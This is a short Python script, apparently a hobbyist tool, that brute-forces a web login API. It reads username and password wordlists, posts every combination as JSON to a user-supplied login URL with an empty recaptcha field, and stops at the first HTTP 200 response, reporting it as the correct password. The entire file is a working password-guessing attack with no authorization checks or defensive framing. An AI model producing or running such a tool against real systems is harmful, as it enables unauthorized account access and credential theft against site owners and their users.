import requests

trovata = False

url = input("Insert login url(es. http://192.168.10.1/api/login): ")

scelta1 = input("Insert single password(1) or wordlist(2): ")

if scelta1 == "1":
    passwd = [input("Type password: ")]

elif scelta1 == "2":
    passw = input("Type the name of the wordlist (IN MAIN): ")

    with open(passw, "r", encoding="utf-8") as file:
        passwd = [line.strip() for line in file]

else:
    print("Not valid")
    exit()

scelta2 = input("Insert single username(1) or wordlist(2): ")

if scelta2 == "1":
    utenti = [input("Type username: ")]

elif scelta2 == "2":
    utt = input("Type the name of the username-wordlist(IN MAIN): ")

    with open(utt, "r", encoding="utf-8") as file:
        utenti = [line.strip() for line in file]

else:
    print("Not Valid")
    exit()

session = requests.Session()

for k in utenti:

    print("USER: " + k)

    for j in passwd:

        payload = {
            "username": k,
            "password": j,
            "recaptcha": ""
        }

        try:
            response = session.post(url, json=payload, timeout=5)

            print("STATUS:", response.status_code, end="")
            print(" " + j)

            if response.status_code == 200:

                print("Correct password: " + j)

                trovata = True
                break

        except requests.exceptions.RequestException as e:
            print("Error:", e)

    if trovata:
        break

input("Click enter for exit...")
